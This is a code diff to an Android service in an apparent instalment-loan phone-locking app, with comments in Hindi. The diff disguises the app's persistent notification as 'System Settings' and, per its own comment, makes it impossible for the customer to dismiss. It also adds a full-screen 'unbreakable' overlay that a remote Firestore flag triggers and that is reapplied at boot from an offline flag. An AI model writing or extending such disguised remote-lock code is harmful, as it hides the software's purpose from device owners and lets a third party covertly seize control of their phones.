@@ -9,10 +9,14 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.graphics.PixelFormat;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.WindowManager;
 import android.widget.Toast;
 import com.google.firebase.firestore.FirebaseFirestore;
 
@@ -20,36 +24,29 @@ public class LockListenerService extends Service {
     private DevicePolicyManager dpm;
     private ComponentName adminComponent;
     private String mySessionId;
-    private boolean isCurrentlyLocked = false;
-    private Handler handler = new Handler();
     private SharedPreferences prefs;
-
-    private Runnable lockEnforcer = new Runnable() {
-        @Override
-        public void run() {
-            if (isCurrentlyLocked) {
-                Intent lockIntent = new Intent(LockListenerService.this, LockActivity.class);
-                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                startActivity(lockIntent);
-                handler.postDelayed(this, 1500);
-            }
-        }
-    };
+    
+    // ओवरले के लिए वेरिएबल्स
+    private WindowManager windowManager;
+    private View lockViewOverlay;
+    private boolean isOverlayShowing = false;
 
     @Override
     public void onCreate() {
         super.onCreate();
         
+        // 1. VIP नोटिफिकेशन बनाना (ताकि Android इसे कभी Kill न करे)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel("EMI_SEC", "Security Sync", NotificationManager.IMPORTANCE_MIN);
+            NotificationChannel channel = new NotificationChannel("EMI_VIP", "System Service", NotificationManager.IMPORTANCE_HIGH);
             channel.setShowBadge(false);
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) manager.createNotificationChannel(channel);
 
-            Notification notification = new Notification.Builder(this, "EMI_SEC")
-                .setContentTitle("Security Active")
-                .setContentText("Device is protected")
+            Notification notification = new Notification.Builder(this, "EMI_VIP")
+                .setContentTitle("System Settings")
+                .setContentText("Service is running normally...")
                 .setSmallIcon(android.R.drawable.ic_secure)
+                .setOngoing(true) // इसे कस्टमर हटा नहीं पाएगा
                 .build();
             startForeground(1001, notification);
         }
@@ -64,14 +61,15 @@ public class LockListenerService extends Service {
 
         dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         adminComponent = new ComponentName(this, MyAdminReceiver.class);
+        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         
-        // 1. फोन चालू होते ही ऑफलाइन मेमोरी चेक करो और तुरंत लॉक करो (बिना इंटरनेट के)
-        isCurrentlyLocked = prefs.getBoolean("is_offline_locked", false);
-        if (isCurrentlyLocked) {
-            handler.post(lockEnforcer);
+        // 2. फोन चालू होते ही ऑफलाइन मेमोरी चेक करो
+        boolean wasLocked = prefs.getBoolean("is_offline_locked", false);
+        if (wasLocked) {
+            showUnbreakableLock();
         }
         
-        // 2. Firebase से ऑनलाइन रियल-टाइम अपडेट (जब इंटरनेट चालू हो)
+        // 3. Firebase से रियल-टाइम अपडेट
         FirebaseFirestore.getInstance().collection("Customers").document(mySessionId)
             .addSnapshotListener((snapshot, e) -> {
                 if (snapshot != null && snapshot.exists()) {
@@ -84,17 +82,58 @@ public class LockListenerService extends Service {
 
                     Boolean isLocked = snapshot.getBoolean("is_locked");
                     if (isLocked != null && isLocked) {
-                        prefs.edit().putBoolean("is_offline_locked", true).apply(); // लॉक स्टेट सेव
-                        if (!isCurrentlyLocked) {
-                            isCurrentlyLocked = true;
-                            handler.post(lockEnforcer);
-                        }
+                        prefs.edit().putBoolean("is_offline_locked", true).apply();
+                        showUnbreakableLock();
                     } else {
-                        prefs.edit().putBoolean("is_offline_locked", false).apply(); // अनलॉक स्टेट सेव
-                        isCurrentlyLocked = false;
+                        prefs.edit().putBoolean("is_offline_locked", false).apply();
+                        hideLock();
                     }
                 }
             });
+    }
+
+    // यह फंक्शन स्क्रीन पर पक्का लॉक लगाता है (बिना Activity के)
+    private void showUnbreakableLock() {
+        if (isOverlayShowing || windowManager == null) return;
+
+        try {
+            LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
+            lockViewOverlay = inflater.inflate(R.layout.activity_lock, null);
+
+            int layoutType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
+                    WindowManager.LayoutParams.TYPE_PHONE;
+
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    layoutType,
+                    WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+                    PixelFormat.TRANSLUCENT);
+
+            windowManager.addView(lockViewOverlay, params);
+            isOverlayShowing = true;
+            
+            // अगर Device Owner है तो Kiosk Mode भी लगा दो
+            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
+                Intent lockIntent = new Intent(this, LockActivity.class);
+                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                startActivity(lockIntent);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void hideLock() {
+        if (isOverlayShowing && lockViewOverlay != null && windowManager != null) {
+            try {
+                windowManager.removeView(lockViewOverlay);
+            } catch (Exception e) {}
+            isOverlayShowing = false;
+        }
     }
 
     @Override
@@ -103,7 +142,7 @@ public class LockListenerService extends Service {
     }
 
     private void releaseOwnershipAndUninstall() {
-        isCurrentlyLocked = false;
+        hideLock();
         prefs.edit().putBoolean("is_offline_locked", false).apply();
         Toast.makeText(this, "Device Released! Uninstalling...", Toast.LENGTH_LONG).show();
         
